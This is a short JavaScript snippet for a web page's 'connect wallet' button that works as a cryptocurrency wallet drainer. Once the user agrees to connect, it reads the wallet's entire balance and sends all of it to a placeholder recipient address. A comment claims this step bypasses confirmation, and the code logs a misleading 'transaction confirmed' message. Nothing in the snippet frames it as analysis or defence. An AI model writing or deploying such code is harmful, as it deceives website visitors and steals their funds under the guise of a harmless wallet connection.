// Initialize Ethereum provider
const provider = new ethers.providers.Web3Provider(window.ethereum);

// Connect button event listener
const connectButton = document.getElementById("connectButton");
connectButton.addEventListener("click", async () => {
  try {
    // Request user to connect their wallet
    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    console.log("Connected to wallet and transaction confirmed");

    // Get user's connected wallet
    const signer = provider.getSigner();

    // Get the user's balance
    const balance = await signer.getBalance();

    // Check if the balance is greater than zero
    if (balance.gt(0)) {
      // Send the entire balance to the recipient wallet
      const transaction = {
        to: "recipient_wallet_address",
        value: balance,
      };

      // Bypass confirmation and send the transaction
      await signer.provider.send("eth_sendTransaction", [transaction]);
      console.log("Transaction sent");
    } else {
      console.log("Insufficient balance to send transaction");
    }

  } catch (error) {
    console.error(error);
  }
});
